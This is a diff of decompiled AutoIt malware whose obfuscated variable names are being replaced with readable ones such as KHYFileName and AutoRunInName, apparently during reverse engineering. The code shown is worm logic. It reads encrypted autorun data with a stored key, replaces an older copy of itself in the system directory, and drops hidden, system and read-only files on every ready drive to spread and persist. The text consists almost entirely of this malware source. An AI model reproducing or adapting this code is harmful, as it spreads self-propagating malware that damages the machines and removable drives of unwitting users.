 		EndIf
 	Else
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
+		Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey)
+		Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
 	EndIf
-	If FileExists(@ScriptDir & "\" & $Var0295) Then
-		$Var0345 = FileReadLine(@ScriptDir & "\" & $Var0295, 9)
+	If FileExists(@ScriptDir & "\" & $AutoRunInName) Then
+		$Var0345 = FileReadLine(@ScriptDir & "\" & $AutoRunInName, 9)
 		$Var0345 = StringTrimLeft($Var0345, 1)
 		$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
 		$Var0345 = StringSplit($Var0345, "!")
 		For $Var0346 = 1 To $Var0345[0]
 			If $Var0345[0] = 2 Then
-				If $Var0345[1] = $Var0297 Then
+				If $Var0345[1] = $KHYFileName Then
 					$Var02A8 = $Var0345[2]
 					$Var02A7 = $Var0345[2]
 				Else
-					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
+					Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey)
 				EndIf
 			Else
-				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
+				Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey)
 			EndIf
 		Next
 	Else
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey)
+		Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey)
 	EndIf
-	If FileExists(@ScriptDir & "\" & $Var0294) Then
-		$Var0345 = FileReadLine(@ScriptDir & "\" & $Var0294, 9)
+	If FileExists(@ScriptDir & "\" & $AutoRunIName) Then
+		$Var0345 = FileReadLine(@ScriptDir & "\" & $AutoRunIName, 9)
 		$Var0345 = StringTrimLeft($Var0345, 1)
 		$Var0345 = Decrypt(0, $Var0345, $EncryptionKey, 1)
 		$Var0345 = StringSplit($Var0345, "!")
 		For $Var0346 = 1 To $Var0345[0]
 			If $Var0345[0] = 2 Then
-				If $Var0345[1] = $Var0297 Then
+				If $Var0345[1] = $KHYFileName Then
 					$Var02A8 = $Var0345[2]
 					$Var02A7 = $Var0345[2]
 				Else
-					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
+					Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
 				EndIf
 			Else
-				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
+				Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
 			EndIf
 		Next
 	Else
-		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $EncryptionKey, "rem", $Var02A3)
+		Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
 	EndIf
 Else
-	$Var0340 = FileGetVersion(@SystemDir & "\" & $Var0292)
+	$Var0340 = FileGetVersion(@SystemDir & "\" & $MyExeName)
 	$Var0341 = FileGetVersion(@AutoItExe)
-	If ProcessExists($Var0292) Then
+	If ProcessExists($MyExeName) Then
 		If $Var0341 > $Var0340 Then
 			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
 			$Var02A7 = StringMid(@AutoItExe, $Var0342)
@@ -5880,8 +5882,8 @@ If @ScriptDir = @SystemDir Then
 	If Not @error Then
 		For $Var0350 = 1 To $Var034F[0]
 			If DriveStatus($Var034F[$Var0350]) = "READY" Then
-				FileWrite($Var034F[$Var0350] & "\" & $Var0297, "")
-				FileSetAttrib($Var034F[$Var0350] & "\" & $Var0297, "+RASH")
+				FileWrite($Var034F[$Var0350] & "\" & $KHYFileName, "")
+				FileSetAttrib($Var034F[$Var0350] & "\" & $KHYFileName, "+RASH")
 			EndIf
 		Next
 	EndIf
